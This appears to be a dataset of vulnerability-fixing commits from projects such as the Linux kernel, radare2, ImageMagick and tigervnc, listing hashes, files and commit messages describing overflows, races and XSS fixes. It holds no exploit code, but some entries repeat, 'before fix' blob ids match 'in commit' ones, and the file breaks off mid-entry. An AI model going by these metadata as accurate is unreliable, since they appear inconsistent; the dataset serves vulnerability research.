tmpfs: clear S_ISGID when setting posix ACLs\n\nThis change was missed the tmpfs modification in In CVE-2016-7097 commit 073931017b49 ("posix_acl: Clear SGID bit when setting file permissions") It can test by xfstest generic/375, which failed to clear setgid bit in the following test case on tmpfs:\n\n  touch $testfile   chown 100:100 $testfile   chmod 2755 $testfile   _runas -u 100 -g 101 -- setfacl -m u::rwx,g::rwx,o::rwx $testfile\n\nSigned-off-by: Gu Zheng <guzheng1@huawei.com> Signed-off-by: Al Viro <viro@zeniv.linux.org.uk>

======================================================================
Commit With Fix: 
    ce5b36e44b714b18b0bcd34c6db0187b8d13bab8
File(s) In Commit: 
    plugins/markdown_plugin/_parsedown.inc.php
Blob(s) In Commit: 
    7aea9f00655159e56eeccc5bc0739f6f569ced4a
Blob(s) Before Fix: 
    7aea9f00655159e56eeccc5bc0739f6f569ced4a
Projects:
    Acidburn0zzz_b2evolution
Commit Message for ce5b36e44b714b18b0bcd34c6db0187b8d13bab8:
Ignore wrong urls on markdown plugin

======================================================================
Commit With Fix: 
    0f2ff82e11c86c05d051cae32b58226392d33bbf
File(s) In Commit: 
    drivers/gpu/drm/vc4/vc4_gem.c
Blob(s) In Commit: 
    c5fe3554858e513ed30fd8cb8944d34c2b26174d
Blob(s) Before Fix: 
    c5fe3554858e513ed30fd8cb8944d34c2b26174d
Projects:
    0-T-0_ps4-linux
Commit Message for 0f2ff82e11c86c05d051cae32b58226392d33bbf:
drm/vc4: Fix an integer overflow in temporary allocation layout.\n\nWe copy the unvalidated ioctl arguments from the user into kernel temporary memory to run the validation from, to avoid a race where the user updates the unvalidate contents in between validating them and copying them into the validated BO.\n\nHowever, in setting up the layout of the kernel side, we failed to check one of the additions (the roundup() for shader_rec_offset) against integer overflow, allowing a nearly MAX_UINT value of bin_cl_size to cause us to under-allocate the temporary space that we then copy_from_user into.\n\nReported-by: Murray McAllister <murray.mcallister@insomniasec.com> Signed-off-by: Eric Anholt <eric@anholt.net> Fixes: d5b1a78a772f ("drm/vc4: Add support for drawing 3D frames.")

======================================================================
Commit With Fix: 
    6b8ac63847bc2f958dd93c09edc941a0118992d9
File(s) In Commit: 
    drivers/gpu/drm/vc4/vc4_gem.c
Blob(s) In Commit: 
    ab3016982466c3ca35ba479050ee107d26eb50ac
Blob(s) Before Fix: 
    ab3016982466c3ca35ba479050ee107d26eb50ac
Projects:
    0-T-0_ps4-linux
Commit Message for 6b8ac63847bc2f958dd93c09edc941a0118992d9:
drm/vc4: Return -EINVAL on the overflow checks failing.\n\nBy failing to set the errno, we'd continue on to trying to set up the RCL, and then oops on trying to dereference the tile_bo that binning validation should have set up.\n\nReported-by: Ingo Molnar <mingo@kernel.org> Signed-off-by: Eric Anholt <eric@anholt.net> Fixes: d5b1a78a772f ("drm/vc4: Add support for drawing 3D frames.")

======================================================================
Commit With Fix: 
    18c020124ff1b2441f714da2017f63dba50720ba
File(s) In Commit: 
    common/rfb/PixelBuffer.cxx
Blob(s) In Commit: 
    7f3df6cba883f6acbf8f26c541eaefd63f917a50
Blob(s) Before Fix: 
    7f3df6cba883f6acbf8f26c541eaefd63f917a50
Projects:
    0019_tigervnc
Commit Message for 18c020124ff1b2441f714da2017f63dba50720ba:
Fix buffer overflow in ModifiablePixelBuffer::fillRect.\n\nIt can be triggered by RRE message with subrectangle out of framebuffer boundaries. It may prevent the same kind of issue caused by evil message from another encoding too.

======================================================================
Commit With Fix: 
    30d598ce7cd3f136ee9d7097f39fa9818a272441
File(s) In Commit: 
    protocols/purple/ft.c
Blob(s) In Commit: 
    79476ebc97aaa66b027a5a6f142d8b73a2ce31b1
Blob(s) Before Fix: 
    79476ebc97aaa66b027a5a6f142d8b73a2ce31b1
Projects:
    AaronVanGeffen_bitlbee
Commit Message for 30d598ce7cd3f136ee9d7097f39fa9818a272441:
purple: Fix crash on ft requests from unknown contacts\n\nFollowup to 701ab81 (included in 3.5) which was a partial fix which only improved things for non-libpurple file transfers (that is, just jabber)

======================================================================
Commit With Fix: 
    d21017b52a585f145e8d62781bcc1c5fefc7ee37
File(s) In Commit: 
    gst/asfdemux/gstasfdemux.c
Blob(s) In Commit: 
    b8d48ad6863c802e94fea2a8cd53797210d935ed
Blob(s) Before Fix: 
    b8d48ad6863c802e94fea2a8cd53797210d935ed
Projects:
    0x4b1d3n_WebKitForWayland
Commit Message for d21017b52a585f145e8d62781bcc1c5fefc7ee37:
asfdemux: Check that we have enough data available before parsing bool/uint extended content descriptors\n\nhttps://bugzilla.gnome.org/show_bug.cgi?id=777955

======================================================================
Commit With Fix: 
    7f02eca670f29c00a1d2c305e96febae6ce5d37b
File(s) In Commit: 
    libyara/grammar.y
Blob(s) In Commit: 
    bf3c88b4d2119eae8d4b349689f85713e8649b32
Blob(s) Before Fix: 
    bf3c88b4d2119eae8d4b349689f85713e8649b32
Projects:
    06052017_yara
Commit Message for 7f02eca670f29c00a1d2c305e96febae6ce5d37b:
Make sure that loop depth is greater than 0 before decrementing it.

======================================================================
Commit With Fix: 
    9dcfc7daa4c940992920d3b2fbd317da20e44aad
File(s) In Commit: 
    lib/viewvc.py
Blob(s) In Commit: 
    922baa2e15940115a78ce6d82ac03f8768ce3ee2
Blob(s) Before Fix: 
    922baa2e15940115a78ce6d82ac03f8768ce3ee2
Projects:
    00zhengfu00_EventBus
Commit Message for 9dcfc7daa4c940992920d3b2fbd317da20e44aad:
Escape some raw path data before handing off to templates\n\n* lib/viewvc.py   (nav_path): Escape the 'name' property of navigation path components     the same way we escape that of the 'root' path component.\n\nReported by: Thomas Gerbet <thomas.gerbet@enalean.com>

======================================================================
Commit With Fix: 
    34b2cef20f19c87999fff3da4071e66937db9644
File(s) In Commit: 
    net/ipv4/ip_sockglue.c
Blob(s) In Commit: 
    900011709e3b8e4807daaa6bf537c3871a7d9306
Blob(s) Before Fix: 
    900011709e3b8e4807daaa6bf537c3871a7d9306
Projects:
    0-T-0_ps4-linux
Commit Message for 34b2cef20f19c87999fff3da4071e66937db9644:
ipv4: keep skb->dst around in presence of IP options\n\nAndrey Konovalov got crashes in __ip_options_echo() when a NULL skb->dst is accessed.\n\nipv4_pktinfo_prepare() should not drop the dst if (evil) IP options are present.\n\nWe could refine the test to the presence of ts_needtime or srr, but IP options are not often used, so let's be conservative.\n\nThanks to syzkaller team for finding this bug.\n\nFixes: d826eb14ecef ("ipv4: PKTINFO doesnt need dst reference") Signed-off-by: Eric Dumazet <edumazet@google.com> Reported-by: Andrey Konovalov <andreyknvl@google.com> Signed-off-by: David S. Miller <davem@davemloft.net>

======================================================================
Commit With Fix: 
    16af238036a5464ae8f2420ed3af214f0de875f9
File(s) In Commit: 
    src/lxc/lxc_user_nic.c
Blob(s) In Commit: 
    96dc3986fd87c7c9ae9457e013dcae4cc94a6043
Blob(s) Before Fix: 
    96dc3986fd87c7c9ae9457e013dcae4cc94a6043
Projects:
    0x0916_lxc
Commit Message for 16af238036a5464ae8f2420ed3af214f0de875f9:
CVE-2017-5985: Ensure target netns is caller-owned\n\nBefore this commit, lxc-user-nic could potentially have been tricked into operating on a network namespace over which the caller did not hold privilege.\n\nThis commit ensures that the caller is privileged over the network namespace by temporarily dropping privilege.\n\nLaunchpad: https://bugs.launchpad.net/ubuntu/+source/lxc/+bug/1654676 Reported-by: Jann Horn <jannh@google.com> Signed-off-by: Christian Brauner <christian.brauner@ubuntu.com>

======================================================================
Commit With Fix: 
    2dcab598484185dea7ec22219c76dcdd59e3cb90
File(s) In Commit: 
    net/sctp/socket.c
Blob(s) In Commit: 
    e214d2e7e9a30c02847daf354668c42eeaffd0d6
Blob(s) Before Fix: 
    e214d2e7e9a30c02847daf354668c42eeaffd0d6
Projects:
    0-T-0_ps4-linux
Commit Message for 2dcab598484185dea7ec22219c76dcdd59e3cb90:
sctp: avoid BUG_ON on sctp_wait_for_sndbuf\n\nAlexander Popov reported that an application may trigger a BUG_ON in sctp_wait_for_sndbuf if the socket tx buffer is full, a thread is waiting on it to queue more data and meanwhile another thread peels off the association being used by the first thread.\n\nThis patch replaces the BUG_ON call with a proper error handling. It will return -EPIPE to the original sendmsg call, similarly to what would have been done if the association wasn't found in the first place.\n\nAcked-by: Alexander Popov <alex.popov@linux.com> Signed-off-by: Marcelo Ricardo Leitner <marcelo.leitner@gmail.com> Reviewed-by: Xin Long <lucien.xin@gmail.com> Signed-off-by: David S. Miller <davem@davemloft.net>

======================================================================
Commit With Fix: 
    321027c1fe77f892f4ea07846aeae08cefbbb290
File(s) In Commit: 
    kernel/events/core.c
Blob(s) In Commit: 
    cbc5937265da842bc714cbccf8091484caa5f536
Blob(s) Before Fix: 
    cbc5937265da842bc714cbccf8091484caa5f536
Projects:
    0-T-0_ps4-linux
Commit Message for 321027c1fe77f892f4ea07846aeae08cefbbb290:
perf/core: Fix concurrent sys_perf_event_open() vs. 'move_group' race\n\nDi Shen reported a race between two concurrent sys_perf_event_open() calls where both try and move the same pre-existing software group into a hardware context.\n\nThe problem is exactly that described in commit:\n\n  f63a8daa5812 ("perf: Fix event->ctx locking")\n\n... where, while we wait for a ctx->mutex acquisition, the event->ctx relation can have changed under us.\n\nThat very same commit failed to recognise sys_perf_event_context() as an external access vector to the events and thereby didn't apply the established locking rules correctly.\n\nSo while one sys_perf_event_open() call is stuck waiting on mutex_lock_double(), the other (which owns said locks) moves the group about. So by the time the former sys_perf_event_open() acquires the locks, the context we've acquired is stale (and possibly dead).\n\nApply the established locking rules as per perf_event_ctx_lock_nested() to the mutex_lock_double() for the 'move_group' case. This obviously means we need to validate state after we acquire the locks.\n\nReported-by: Di Shen (Keen Lab) Tested-by: John Dias <joaodias@google.com> Signed-off-by: Peter Zijlstra (Intel) <peterz@infradead.org> Cc: Alexander Shishkin <alexander.shishkin@linux.intel.com> Cc: Arnaldo Carvalho de Melo <acme@kernel.org> Cc: Arnaldo Carvalho de Melo <acme@redhat.com> Cc: Jiri Olsa <jolsa@redhat.com> Cc: Kees Cook <keescook@chromium.org> Cc: Linus Torvalds <torvalds@linux-foundation.org> Cc: Min Chong <mchong@google.com> Cc: Peter Zijlstra <peterz@infradead.org> Cc: Stephane Eranian <eranian@google.com> Cc: Thomas Gleixner <tglx@linutronix.de> Cc: Vince Weaver <vincent.weaver@maine.edu> Fixes: f63a8daa5812 ("perf: Fix event->ctx locking") Link: http://lkml.kernel.org/r/20170106131444.GZ3174@twins.programming.kicks-ass.net Signed-off-by: Ingo Molnar <mingo@kernel.org>

======================================================================
Commit With Fix: 
    5edabca9d4cff7f1f2b68f0bac55ef99d9798ba4
File(s) In Commit: 
    net/dccp/input.c
Blob(s) In Commit: 
    8fedc2d497709b3dea9202894f45bf5cab043361
Blob(s) Before Fix: 
    8fedc2d497709b3dea9202894f45bf5cab043361
Projects:
    0-T-0_ps4-linux
Commit Message for 5edabca9d4cff7f1f2b68f0bac55ef99d9798ba4:
dccp: fix freeing skb too early for IPV6_RECVPKTINFO\n\nIn the current DCCP implementation an skb for a DCCP_PKT_REQUEST packet is forcibly freed via __kfree_skb in dccp_rcv_state_process if dccp_v6_conn_request successfully returns.\n\nHowever, if IPV6_RECVPKTINFO is set on a socket, the address of the skb is saved to ireq->pktopts and the ref count for skb is incremented in dccp_v6_conn_request, so skb is still in use. Nevertheless, it gets freed in dccp_rcv_state_process.\n\nFix by calling consume_skb instead of doing goto discard and therefore calling __kfree_skb.\n\nSimilar fixes for TCP:\n\nfb7e2399ec17f1004c0e0ccfd17439f8759ede01 [TCP]: skb is unexpectedly freed. 0aea76d35c9651d55bbaf746e7914e5f9ae5a25d tcp: SYN packets are now simply consumed\n\nSigned-off-by: Andrey Konovalov <andreyknvl@google.com> Acked-by: Eric Dumazet <edumazet@google.com> Signed-off-by: David S. Miller <davem@davemloft.net>

======================================================================
Commit With Fix: 
    72794dc3523bbd5bb370de3c5857cb736c387e18
File(s) In Commit: 
    libr/bin/p/bin_bflt.c
Blob(s) In Commit: 
    833bbba8652a1c780b4681d8c55fc04ee05f657e
Blob(s) Before Fix: 
    833bbba8652a1c780b4681d8c55fc04ee05f657e
Projects:
    0-T-0_radare2
Commit Message for 72794dc3523bbd5bb370de3c5857cb736c387e18:
Fix #6829 oob write because of using wrong struct

======================================================================
Commit With Fix: 
    ccf7abb93af09ad0868ae9033d1ca8108bdaec82
File(s) In Commit: 
    net/ipv4/tcp.c
Blob(s) In Commit: 
    0efb4c7f6704f662b6c762e48698a41564add2a4
Blob(s) Before Fix: 
    0efb4c7f6704f662b6c762e48698a41564add2a4
Projects:
    0-T-0_ps4-linux
Commit Message for ccf7abb93af09ad0868ae9033d1ca8108bdaec82:
tcp: avoid infinite loop in tcp_splice_read()\n\nSplicing from TCP socket is vulnerable when a packet with URG flag is received and stored into receive queue.\n\n__tcp_splice_read() returns 0, and sk_wait_data() immediately returns since there is the problematic skb in queue.\n\nThis is a nice way to burn cpu (aka infinite loop) and trigger soft lockups.\n\nAgain, this gem was found by syzkaller tool.\n\nFixes: 9c55e01c0cc8 ("[TCP]: Splice receive support.") Signed-off-by: Eric Dumazet <edumazet@google.com> Reported-by: Dmitry Vyukov  <dvyukov@google.com> Cc: Willy Tarreau <w@1wt.eu> Signed-off-by: David S. Miller <davem@davemloft.net>

======================================================================
Commit With Fix: 
    ad55822430a03fe075221b543efb434567e9e431
File(s) In Commit: 
    libr/bin/p/bin_dex.c
Blob(s) In Commit: 
    9a91dae9c69e4222c696b2f80784bc8229c870c7
Blob(s) Before Fix: 
    9a91dae9c69e4222c696b2f80784bc8229c870c7
Projects:
    0-T-0_radare2
Commit Message for ad55822430a03fe075221b543efb434567e9e431:
Fix #6836 - oob write in dex

======================================================================
Commit With Fix: 
    d199fab63c11998a602205f7ee7ff7c05c97164b
File(s) In Commit: 
    net/packet/af_packet.c
Blob(s) In Commit: 
    0f03f6a53b4ddb8093a2122914200c0738af8fb3
Blob(s) Before Fix: 
    0f03f6a53b4ddb8093a2122914200c0738af8fb3
Projects:
    0-T-0_ps4-linux
Commit Message for d199fab63c11998a602205f7ee7ff7c05c97164b:
packet: fix races in fanout_add()\n\nMultiple threads can call fanout_add() at the same time.\n\nWe need to grab fanout_mutex earlier to avoid races that could lead to one thread freeing po->rollover that was set by another thread.\n\nDo the same in fanout_release(), for peace of mind, and to help us finding lockdep issues earlier.\n\nFixes: dc99f600698d ("packet: Add fanout support.") Fixes: 0648ab70afe6 ("packet: rollover prepare: per-socket state") Signed-off-by: Eric Dumazet <edumazet@google.com> Cc: Willem de Bruijn <willemb@google.com> Signed-off-by: David S. Miller <davem@davemloft.net>

======================================================================
Commit With Fix: 
    ca4ef4574f1ee5252e2cd365f8f5d5bafd048f32
File(s) In Commit: 
    net/ipv4/ip_sockglue.c
Blob(s) In Commit: 
    ebd953bc5607f3b25fffddcb26a5c65e5490cb2b
Blob(s) Before Fix: 
    ebd953bc5607f3b25fffddcb26a5c65e5490cb2b
Projects:
    0-T-0_ps4-linux
Commit Message for ca4ef4574f1ee5252e2cd365f8f5d5bafd048f32:
ip: fix IP_CHECKSUM handling\n\nThe skbs processed by ip_cmsg_recv() are not guaranteed to be linear e.g. when sending UDP packets over loopback with MSGMORE. Using csum_partial() on [potentially] the whole skb len is dangerous  instead be on the safe side and use skb_checksum().\n\nThanks to syzkaller team to detect the issue and provide the reproducer.\n\nv1 -> v2:  - move the variable declaration in a tighter scope\n\nFixes: ad6f939ab193 ("ip: Add offset parameter to ip_cmsg_recv") Reported-by: Andrey Konovalov <andreyknvl@google.com> Signed-off-by: Paolo Abeni <pabeni@redhat.com> Acked-by: Eric Dumazet <edumazet@google.com> Signed-off-by: David S. Miller <davem@davemloft.net>

======================================================================
Commit With Fix: 
    4c03b862b12f980456f9de92db6d508a4999b788
File(s) In Commit: 
    net/irda/irqueue.c
Blob(s) In Commit: 
    160dc89335e207e593401f43c0637a766bdb9b68
Blob(s) Before Fix: 
    160dc89335e207e593401f43c0637a766bdb9b68
Projects:
    0-T-0_ps4-linux
Commit Message for 4c03b862b12f980456f9de92db6d508a4999b788:
irda: Fix lockdep annotations in hashbin_delete().\n\nA nested lock depth was added to the hasbin_delete() code but it doesn't actually work some well and results in tons of lockdep splats.\n\nFix the code instead to properly drop the lock around the operation and just keep peeking the head of the hashbin queue.\n\nReported-by: Dmitry Vyukov <dvyukov@google.com> Tested-by: Dmitry Vyukov <dvyukov@google.com> Signed-off-by: David S. Miller <davem@davemloft.net>

======================================================================
Commit With Fix: 
    dfcb9f4f99f1e9a49e43398a7bfbf56927544af1
File(s) In Commit: 
    net/sctp/socket.c
Blob(s) In Commit: 
    465a9c8464f9477f827c14cbdab6879ac181a507
Blob(s) Before Fix: 
    465a9c8464f9477f827c14cbdab6879ac181a507
Projects:
    0-T-0_ps4-linux
Commit Message for dfcb9f4f99f1e9a49e43398a7bfbf56927544af1:
sctp: deny peeloff operation on asocs with threads sleeping on it\n\ncommit 2dcab5984841 ("sctp: avoid BUG_ON on sctp_wait_for_sndbuf") attempted to avoid a BUG_ON call when the association being used for a sendmsg() is blocked waiting for more sndbuf and another thread did a peeloff operation on such asoc, moving it to another socket.\n\nAs Ben Hutchings noticed, then in such case it would return without locking back the socket and would cause two unlocks in a row.\n\nFurther analysis also revealed that it could allow a double free if the application managed to peeloff the asoc that is created during the sendmsg call, because then sctp_sendmsg() would try to free the asoc that was created only for that call.\n\nThis patch takes another approach. It will deny the peeloff operation if there is a thread sleeping on the asoc, so this situation doesn't exist anymore. This avoids the issues described above and also honors the syscalls that are already being handled (it can be multiple sendmsg calls).\n\nJoint work with Xin Long.\n\nFixes: 2dcab5984841 ("sctp: avoid BUG_ON on sctp_wait_for_sndbuf") Cc: Alexander Popov <alex.popov@linux.com> Cc: Ben Hutchings <ben@decadent.org.uk> Signed-off-by: Marcelo Ricardo Leitner <marcelo.leitner@gmail.com> Signed-off-by: Xin Long <lucien.xin@gmail.com> Signed-off-by: David S. Miller <davem@davemloft.net>

======================================================================
Commit With Fix: 
    c334dd8499a681587dd4199e90b0aa0eba814c1d
File(s) In Commit: 
    index.php
Blob(s) In Commit: 
    524fa313ce593554f4176e874585dbec0f914254
Blob(s) Before Fix: 
    524fa313ce593554f4176e874585dbec0f914254
Projects:
    ymuyi_trace.moe
Commit Message for c334dd8499a681587dd4199e90b0aa0eba814c1d:
Fix #8 XSS issue

======================================================================
Commit With Fix: 
    68338b71a563b24e62617bb629059adc0c94b230
File(s) In Commit: 
    libr/bin/p/bin_dex.c
Blob(s) In Commit: 
    13a7b45430aeca38ea8ebbc76e34f406ac0efe14
Blob(s) Before Fix: 
    13a7b45430aeca38ea8ebbc76e34f406ac0efe14
Projects:
    0-T-0_radare2
Commit Message for 68338b71a563b24e62617bb629059adc0c94b230:
fix #6872

======================================================================
Commit With Fix: 
    fbd8494d5e4e46bf2e90cb6116903e404374fb56
File(s) In Commit: 
    src/bplist.c
Blob(s) In Commit: 
    20e5090e6755052a72fd939ca9ea53aa5ca8ba29
Blob(s) Before Fix: 
    20e5090e6755052a72fd939ca9ea53aa5ca8ba29
Projects:
    0neday_libimobiledevice
Commit Message for fbd8494d5e4e46bf2e90cb6116903e404374fb56:
bplist: Make sure to bail out if malloc() fails in parse_string_node()\n\nCredit to Wang Junjie <zhunkibatu@gmail.com> (#93)

======================================================================
Commit With Fix: 
    32ee5213fe64f1e10ec76c1ee861ee6f233120dd
File(s) In Commit: 
    src/bplist.c
Blob(s) In Commit: 
    7d21b273b865d734155a4e96e88e67a2145d4760
Blob(s) Before Fix: 
    7d21b273b865d734155a4e96e88e67a2145d4760
Projects:
    0neday_libimobiledevice
Commit Message for 32ee5213fe64f1e10ec76c1ee861ee6f233120dd:
bplist: Fix data range check for string/data/dict/array nodes\n\nPassing a size of 0xFFFFFFFFFFFFFFFF to parse_string_node() might result in a memcpy with a size of -1, leading to undefined behavior. This commit makes sure that the actual node data (which depends on the size) is in the range start_of_object..start_of_object+size.\n\nCredit to OSS-Fuzz

======================================================================
Commit With Fix: 
    32ee5213fe64f1e10ec76c1ee861ee6f233120dd
File(s) In Commit: 
    src/bplist.c
Blob(s) In Commit: 
    7d21b273b865d734155a4e96e88e67a2145d4760
Blob(s) Before Fix: 
    7d21b273b865d734155a4e96e88e67a2145d4760
Projects:
    0neday_libimobiledevice
Commit Message for 32ee5213fe64f1e10ec76c1ee861ee6f233120dd:
bplist: Fix data range check for string/data/dict/array nodes\n\nPassing a size of 0xFFFFFFFFFFFFFFFF to parse_string_node() might result in a memcpy with a size of -1, leading to undefined behavior. This commit makes sure that the actual node data (which depends on the size) is in the range start_of_object..start_of_object+size.\n\nCredit to OSS-Fuzz

======================================================================
Commit With Fix: 
    f41e941341e44aa86edd4483c4487ec09a074257
File(s) In Commit: 
    libr/asm/p/asm_dalvik.c
Blob(s) In Commit: 
    15654b30e584a65cf3f67068dce072e61324c7c1
Blob(s) Before Fix: 
    15654b30e584a65cf3f67068dce072e61324c7c1
Projects:
    0-T-0_radare2
Commit Message for f41e941341e44aa86edd4483c4487ec09a074257:
Fix #6885 - oob write in dalvik_disassemble

======================================================================
Commit With Fix: 
    7f2dc7a1afc067d0c89f12c82bcdec0445fb1b94
File(s) In Commit: 
    coders/psd.c
Blob(s) In Commit: 
    fb93c57dd144d115c985877eff2ef8c62ce29d37
Blob(s) Before Fix: 
    fb93c57dd144d115c985877eff2ef8c62ce29d37
Projects:
    2016repotsheyue_ImageMagick
Commit Message for 7f2dc7a1afc067d0c89f12c82bcdec0445fb1b94:
Added missing null check.

======================================================================
Commit With Fix: 
    65f75a32a93ae4044c528a987a68366ecd4b46b9
File(s) In Commit: 
    coders/tga.c
Blob(s) In Commit: 
    7b87278ef55753d09e7d521b28de236408418314
Blob(s) Before Fix: 
    7b87278ef55753d09e7d521b28de236408418314
Projects:
    2016repotsheyue_ImageMagick
Commit Message for 65f75a32a93ae4044c528a987a68366ecd4b46b9:
https://github.com/ImageMagick/ImageMagick/pull/359

======================================================================
Commit With Fix: 
    3007531bfd326c5c1e29cd41d2cd80c166de8528
File(s) In Commit: 
    coders/sun.c
Blob(s) In Commit: 
    c11a33c62bee5f2213ab65ddc773acdef3369725
Blob(s) Before Fix: 
    c11a33c62bee5f2213ab65ddc773acdef3369725
Projects:
    2016repotsheyue_ImageMagick
Commit Message for 3007531bfd326c5c1e29cd41d2cd80c166de8528:
https://github.com/ImageMagick/ImageMagick/issues/375 https://github.com/ImageMagick/ImageMagick/issues/376

======================================================================
Commit With Fix: 
    d31fec57e9dfb0516deead2053a856e3c71e9751
File(s) In Commit: 
    coders/xcf.c
Blob(s) In Commit: 
    2feef82ff19396e57ec010ec1aae8120575f5c5b
Blob(s) Before Fix: 
    2feef82ff19396e57ec010ec1aae8120575f5c5b
Projects:
    2016repotsheyue_ImageMagick
Commit Message for d31fec57e9dfb0516deead2053a856e3c71e9751:
Check for image list before we destroy the last image in XCF coder (patch sent privately by Андрей Черный)

======================================================================
Commit With Fix: 
    1677251434b6e8b2be8f1d4376a3e78f7be14d95
File(s) In Commit: 
    view_filters_page.php
Blob(s) In Commit: 
    5d807683d3b467dfd2f58f48fde7596369ad1709
Blob(s) Before Fix: 
    5d807683d3b467dfd2f58f48fde7596369ad1709
Projects:
    01-Scripts_mantisbt
Commit Message for 1677251434b6e8b2be8f1d4376a3e78f7be14d95:
Fix XSS in view_filters_page.php\n\nThe value of the view_type parameter was not sanitized before being displayed as a hidden input.\n\nThis vulnerability was reported by Etienne Landais.\n\nFixes #22497

======================================================================
Commit With Fix: 
    f98f5d4adc1c4bd4033638f6167c1bb95d642f89
File(s) In Commit: 
    lib/ytnef.c
Blob(s) In Commit: 
    afb2efbfe73b780a5c60b6fd2c1940614c58502f
Blob(s) Before Fix: 
    afb2efbfe73b780a5c60b6fd2c1940614c58502f
Projects:
    strk_ytnef
Commit Message for f98f5d4adc1c4bd4033638f6167c1bb95d642f89:
BugFix - data length\n\nEven tho this is a "LONG" type, it's actually only 4 bytes. Typecasting it to a long* caused a dereference beyond the end of the allocated region.\n\nissues#28

======================================================================
Commit With Fix: 
    194f592e205990ea8fce72b6c571c14350aca716
File(s) In Commit: 
    dcraw_foveon.c
Blob(s) In Commit: 
    bdde89d60178831b3efcb53f14e2b95763c6db43
Blob(s) Before Fix: 
    bdde89d60178831b3efcb53f14e2b95763c6db43
Projects:
    LibRaw_LibRaw-demosaic-pack-GPL2
Commit Message for 194f592e205990ea8fce72b6c571c14350aca716:
Fixed possible foveon buffer overrun (Secunia SA750000)

======================================================================
Commit With Fix: 
    194f592e205990ea8fce72b6c571c14350aca716
File(s) In Commit: 
    dcraw_foveon.c
Blob(s) In Commit: 
    bdde89d60178831b3efcb53f14e2b95763c6db43
Blob(s) Before Fix: 
    bdde89d60178831b3efcb53f14e2b95763c6db43
Projects:
    LibRaw_LibRaw-demosaic-pack-GPL2
Commit Message for 194f592e205990ea8fce72b6c571c14350aca716:
Fixed possible foveon buffer overrun (Secunia SA750000)

======================================================================
Commit With Fix: 
    f833c53cb596e9e1792949f762e0b33661822748
File(s) In Commit: 
    src/aiff.c
Blob(s) In Commit: 
    45864b76da8865bf7c3452dc0887225ff0beee52
Blob(s) Before Fix: 
    45864b76da8865bf7c3452dc0887225ff0beee52
Projects:
    12gjang_libsndfile
Commit Message for f833c53cb596e9e1792949f762e0b33661822748:
src/aiff.c: Fix a buffer read overflow\n\nSecunia Advisory SA76717.\n\nFound by: Laurent Delosieres, Secunia Research at Flexera Software

======================================================================
Commit With Fix: 
    62046f511fc02ad783ad170404c80db3c69f0408
File(s) In Commit: 
    web/concrete/tools/files/selector_data.php
Blob(s) In Commit: 
    9bbaa7ee54578a5ca2dc1c4c8813ea4fb33ba832
Blob(s) Before Fix: 
    9bbaa7ee54578a5ca2dc1c4c8813ea4fb33ba832
Projects:
    16nsk_concrete5-5.7.0
Commit Message for 62046f511fc02ad783ad170404c80db3c69f0408:
Fix #1948

======================================================================
Commit With Fix: 
    6fe86eef621b9849f51a5e1e5d73258a93440403
File(s) In Commit: 
    windows/winkernel_mm.c
Blob(s) In Commit: 
    ecdc1ca2d68ad1bdc848182dcb3787cfdb0599d9
Blob(s) Before Fix: 
    ecdc1ca2d68ad1bdc848182dcb3787cfdb0599d9
Projects:
    0vercl0k_capstone
Commit Message for 6fe86eef621b9849f51a5e1e5d73258a93440403:
provide a validity check to prevent against Integer overflow conditions (#870)\n\n* provide a validity check to prevent against Integer overflow conditions    * fix some style issues.

======================================================================
Commit With Fix: 
    75293ed4e5f31f04e54689bfe2c647e3e3f5e1a9
File(s) In Commit: 
    includes/component.php
Blob(s) In Commit: 
    ec05a320a0dfebed375c93fd195b9d5ab18a045c
Blob(s) Before Fix: 
    ec05a320a0dfebed375c93fd195b9d5ab18a045c
Projects:
    Apatrid_buddypress-docs
Commit Message for 75293ed4e5f31f04e54689bfe2c647e3e3f5e1a9:
Improved permission check when processing a Doc save request.

======================================================================
Commit With Fix: 
    77b2631c78461965bc9a7414aae206b5c514e1b3
File(s) In Commit: 
    src/fe-common/irc/fe-netjoin.c
Blob(s) In Commit: 
    8272093fea332830d77c2ca0a28cc59932ca1ad6
Blob(s) Before Fix: 
    8272093fea332830d77c2ca0a28cc59932ca1ad6
Projects:
    0577215664_irssi
Commit Message for 77b2631c78461965bc9a7414aae206b5c514e1b3:
Merge branch 'netjoin-timeout' into 'master'\n\nfe-netjoin: remove irc servers on "server disconnected" signal\n\nCloses #7\n\nSee merge request !10

======================================================================
Commit With Fix: 
    1ebb71143758f45dc0fa76e2f48429e13b16d110
File(s) In Commit: 
    drivers/hid/hid-cypress.c
Blob(s) In Commit: 
    1689568b597d4e5bb8824ccbe679f627525bf2a4
Blob(s) Before Fix: 
    1689568b597d4e5bb8824ccbe679f627525bf2a4
Projects:
    0-T-0_ps4-linux
Commit Message for 1ebb71143758f45dc0fa76e2f48429e13b16d110:
HID: hid-cypress: validate length of report\n\nMake sure we have enough of a report structure to validate before looking at it.\n\nReported-by: Benoit Camredon <benoit.camredon@airbus.com> Tested-by: Benoit Camredon <benoit.camredon@airbus.com> Cc: stable <stable@vger.kernel.org> Signed-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org> Signed-off-by: Jiri Kosina <jkosina@suse.cz>

======================================================================
Commit With Fix: 
    7ab66cca5bbdf6cb2d69339ef4f513d95e532dbf
File(s) In Commit: 
    libr/util/r_pkcs7.c
Blob(s) In Commit: 
    467f58fa729a43d2970010ada7f5eee36d6815d4
Blob(s) Before Fix: 
    467f58fa729a43d2970010ada7f5eee36d6815d4
Projects:
    0-T-0_radare2
Commit Message for 7ab66cca5bbdf6cb2d69339ef4f513d95e532dbf:
Fix #7152 - Null deref in cms\n\n

======================================================================
Commit With Fix: 
    bf3bdac082978ca32895a4b6a123016094905689
File(s) In Commit: 
    common/rfb/SMsgReader.cxx
Blob(s) In Commit: 
    3c08fd6fd58a5207fd28c2cd7ee21880e6708c88
Blob(s) Before Fix: 
    3c08fd6fd58a5207fd28c2cd7ee21880e6708c88
Projects:
    0019_tigervnc
Commit Message for bf3bdac082978ca32895a4b6a123016094905689:
Fix crash from integer overflow in SMsgReader::readClientCutText\n\nThe length sent by client is U32, but is converted into int. If it was bigger than 0x7fffffff the resulting int is negative, it passes the check against maxCutText and later throws std::bad_alloc from CharArray which takes down the whole server.\n\nAll the Streaming API deals with lengths in ints, so we can't tell it to skip that big amount of data. And it is not realistic to expect more than 2GB of clipboard data anyway. So lets just throw rdr::Exception that will disconnect this client and keep the server alive.

======================================================================
Commit With Fix: 
    ee0d8d8482345ff97a75a7d747efc309f13b0d80
File(s) In Commit: 
    net/ipx/af_ipx.c
Blob(s) In Commit: 
    fa31ef29e3fa0bf3973e12e43c57b48eb7d1be45
Blob(s) Before Fix: 
    fa31ef29e3fa0bf3973e12e43c57b48eb7d1be45
Projects:
